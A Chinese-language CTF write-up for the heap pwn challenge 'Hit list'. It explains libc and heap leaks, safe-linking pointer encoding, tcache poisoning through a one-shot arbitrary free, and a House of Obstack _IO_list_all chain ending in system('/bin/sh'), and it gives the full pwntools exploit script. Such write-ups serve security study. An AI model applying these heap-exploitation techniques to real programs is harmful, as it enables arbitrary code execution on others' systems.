# Hit list

## 题目简述

程序用单链表管理两层堆对象：固定大小的 `node` 保存索引、ID 和内容对象指针，`information` 保存 8 字节名称和用户内容。正常菜单不提供 show-after-free，也不能直接覆盖任意地址，但程序保留了一个只可使用一次的 `gift`：当特定申请失败时，用户可以手工输入一个地址并对其执行 `free`。官方解法先用堆整理产生可见的脏元数据，泄露 libc 与 heap，再把这一次任意地址释放扩展为 tcache poisoning，最终伪造 `_IO_list_all` 与 House of Obstack 对象，在 `exit` 时调用 `system("/bin/sh")`。

## 解题过程

### 1. 把 IDA 截图还原为数据结构

PDF 中的两个结构体截图可转写为：

```c
struct information {          // 反编译视图大小 0x408
    char header[8];
    char content[1024];
};

struct node {                 // 大小 0x20
    int index;                // +0x00
    int padding0;             // +0x04
    struct node *next;        // +0x08
    int ID;                   // +0x10
    int padding1;             // +0x14
    struct information *info; // +0x18
};
```

`search` 从全局 `head` 顺着 `next` 查找索引：

```c
struct node *search(int target)
{
    struct node *cur;
    for (cur = head; cur; cur = cur->next) {
        if (cur->index == target)
            return cur;
    }
    return NULL;
}
```

`add_note` 申请一个 `0x20` 的 node，读取 ID，调用 `add_info` 创建第二层对象，再把新节点挂到链表尾部并递增全局索引。PDF 还给出了后门函数的反编译结果，可化简为：

```c
void gift(void)
{
    void *ptr;
    if (!gift_used) {
        scanf("%p", &ptr);
        free(ptr);
        ++gift_used;
    }
}
```

对交叉引用进行检查可知，申请失败路径能够进入 `gift`。因此题目的特殊原语是“一次、需手工提供地址的任意 `free`”，而不是任意写。

### 2. 用脏数据泄露 libc 与 heap

由于程序没有直接的 show-after-free，官方 exp 先反复申请和删除小对象，让 node、information 与 allocator 元数据在相同地址上复用。随后申请 `0x3f0` 大块触发 fastbin consolidation，再申请 `0x48`、`0x78` 两个对象接住整理后的区域。显示这些新对象时，未完全覆盖的内容仍含 allocator 指针：

```python
show(3)
p.recvuntil(b"Information:")
libc_base = u64(p.recvline()[-7:-1].ljust(8, b"\x00")) - 0x21AD30

show(4)
p.recvuntil(b"Information:")
heap_base = u64(p.recvline()[-6:-1].ljust(8, b"\x00")) << 12
```

第二个公式来自 safe-linking。glibc 的编码本质为：

```text
encoded_fd = fd ^ (address_of_fd_field >> 12)
```

当 tcache 项的真实 `fd` 为 `NULL` 时，泄露值只剩所在堆页地址右移 12 位，因此左移 12 位即可恢复页对齐的 heap 基址。这里不能笼统地说“safe-linking 会隐藏所有堆信息”；空链尾元素反而会直接暴露堆页号。

### 3. 把一次任意 `free` 放大成 tcache poisoning

有了两类基址后，脚本计算：

```python
victim = heap_base + 0x1190 + 0x10
target = IO_list_all + 0x70
encoded_target = ((heap_base + 0x1000) >> 12) ^ target
```

随后通过一组 `0xf0` 大小对象布置 tcache，并以负数大小触发申请失败。`gift` 对 `victim` 执行一次任意释放，使这个地址进入可操纵的空闲链；下一次受控写把 safe-linking 编码后的 `target` 放入链表指针，于是后续申请可落到 `_IO_list_all` 附近。题目会先在用户内容前写自己的 8 字节字段，因此 PDF 特别提醒：exp 中与常规 House of Obstack 布局相比，相关偏移整体提前了 `0x08`。

### 4. House of Obstack 调用链

高版本 glibc 已没有可直接使用的 `__free_hook`。官方解法把假对象挂进 `_IO_list_all`，并将合法虚表指针设为 `_IO_obstack_jumps + 0x20`。退出时触发的关键调用链为：

```text
exit
  -> _IO_flush_all_lockp
  -> _IO_obstack_xsputn
  -> obstack_grow
  -> _obstack_newchunk
  -> CALL_CHUNKFUN
  -> chunkfun(extra_arg, size)
```

假对象将 `chunkfun` 填成 `system`，把 `extra_arg` 填成 `/bin/sh`，同时令 `use_extra_arg` 为真，并满足 `next_free > chunk_limit` 等分支条件。这样最后一级间接调用就是 `system("/bin/sh")`。PDF 给出的外链文章详细分析了这条调用链；本文已概括其利用条件、触发点和参数传递，仍保留原链接供核对 glibc 源码：[一条新的 glibc IO_FILE 利用链：_IO_obstack_jumps 利用分析](https://www.cnblogs.com/7resp4ss/p/17486261.html)。

### 5. PDF exploit 完整转写

下列脚本保持 PDF 的堆风水、固定偏移和 House of Obstack 对象布局。做了两处明确的可执行性修正：PDF 第 80 行把换行写成了字符串 `"/n"`，这里更正为 `"\n"`；`flat` 的 `filler` 改为字节串 `b"\x00"`。PDF 中启用的 `gdb.attach` 改成注释，避免普通运行无条件暂停。

```python
from pwn import *

context(log_level="debug", arch="amd64", os="linux")

p = process("./vuln")
elf = ELF("./vuln")
libc = ELF("./libc.so.6")


def add(id_value, name, size, content):
    p.sendlineafter(b">", b"1")
    p.sendlineafter(b">", str(id_value).encode())
    p.sendlineafter(b">", name)
    p.sendlineafter(b">", str(size).encode())
    p.sendafter(b">", content)


def delete(index):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b">", str(index).encode())


def edit(index, id_value, name, size, content):
    p.sendlineafter(b">", b"3")
    p.sendlineafter(b">", str(index).encode())
    p.sendlineafter(b">", str(id_value).encode())
    p.sendlineafter(b">", name)
    p.sendlineafter(b">", str(size).encode())
    p.sendafter(b">", content)


def show(index):
    p.sendlineafter(b">", b"4")
    p.sendlineafter(b">", str(index).encode())


for i in range(8):
    add(i, b"zena", 0x20, ("{}".format(i) * 0x10).encode())

delete(0)
delete(0)
delete(1)
delete(2)

delete(1)
delete(0)

add(2, b"M1a0", 0x3F0, b"0")  # 2，触发 consolidate
add(3, b"M1ao0", 0x48, b"0")   # 3
add(4, b"M1aoo0", 0x78, b"0" * 0x58)  # 4

# gdb.attach(p)

show(3)
p.recvuntil(b"Information:")
libc_base = u64(p.recvline()[-7:-1].ljust(0x08, b"\x00")) - 0x21AD30

show(4)
p.recvuntil(b"Information:")
heap_base = u64(p.recvline()[-6:-1].ljust(0x08, b"\x00")) << 12

success("libc_base=" + hex(libc_base))
success("heap_base=" + hex(heap_base))

IO_list_all = libc_base + libc.sym["_IO_list_all"]
IO_obstack_jumps = libc_base + 0x2173C0
system_addr = libc_base + libc.sym["system"]
bin_sh = libc_base + 0x01D8678

victim = heap_base + 0x1190 + 0x10
fake_chunk = ((heap_base + 0x1000) >> 12) ^ (IO_list_all + 0x70)

for i in range(5):
    delete(0)

for i in range(9):
    add(i, b"zena", 0xF0, ("{}".format(i) * 0x10).encode())

add(2, b"gap", 0x30, b"0")  # 9

for i in range(7):
    delete(0)
delete(1)
delete(0)

add(1, b"Hakuya", 0xF0, b"0")  # 1
# gdb.attach(p)

# 输入负数令 malloc 失败，进入只可使用一次的 gift。
add(1, b"L0tus", -9, (str(hex(victim))[2:] + "\n").encode())

payload = b"0" * 0xD0
payload += p64(0x100)
payload += p64(fake_chunk)

# tcache poisoning
add(1, b"1sez", 0x130, payload)

payload = flat(
    {
        0x10: 1,
        0x18: 0,
        0x20: 1,
        0x28: 0,
        0x30: system_addr,
        0x40: bin_sh,
        0x48: 1,
        0xD0: IO_obstack_jumps + 0x20,
        0xD8: victim,
    },
    filler=b"\x00",
)

# 布置 House of Obstack 对象。
add(1, p64(0), 0xF0, payload)

# 把 victim 接入 _IO_list_all。
add(999, b"0", 0xF0, p64(0) * 2 + p64(victim))

# exit() 刷新 IO 链并触发 system("/bin/sh")。
p.sendlineafter(b">", b"5")
p.interactive()
```

脚本中的 `0x21ad30`、`0x2173c0`、`0x1d8678` 与各堆偏移均绑定随题 libc 和本次堆布局，不能直接迁移到别的环境。原 PDF 未记录最终 flag，当前目录也没有题目二进制及 libc，故这里只给出静态可审计的利用链，不虚构本地运行结果。

## 方法总结

Hit list 的难点在于原语很弱：一次任意 `free` 还要求先知道地址。官方解法先借对象复用和 consolidation 读取脏元数据，分别恢复 libc 与 heap；再按 safe-linking 公式编码 tcache 指针，把任意释放升级为定向申请；最后以 `_IO_list_all` 为入口，让合法的 `_IO_obstack_jumps` 虚表把 `system` 与 `/bin/sh` 作为函数和参数传入。复现时最容易出错的三处是堆地址中出现换行或空字节导致接收切片失效、题目额外 8 字节字段引起的偏移变化，以及不同 glibc 版本中的 IO 结构和符号偏移漂移。
